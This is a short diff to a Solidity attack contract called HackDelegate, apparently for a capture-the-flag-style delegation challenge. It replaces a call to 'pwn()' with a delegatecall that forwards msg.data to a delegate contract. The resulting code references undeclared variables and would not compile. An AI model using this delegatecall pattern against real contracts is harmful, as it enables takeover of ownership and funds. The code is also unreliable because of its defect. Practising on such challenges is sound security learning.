@@ -13,11 +13,12 @@ contract HackDelegate {
     delegateAddress = IDelegate(_delegateAddress);
   }
 
-  function callFallback(address _addr) public {
-    (bool success, bytes memory data) = _addr.call(
-      abi.encodeWithSignature("pwn()")
-    );
-
+  function callFallback() external {
+    (bool result,) = address(delegateAddress).delegatecall(msg.data);
+    if (result) {
+      this;
+    }
+  
     emit Successful(success, data);
   }
 }
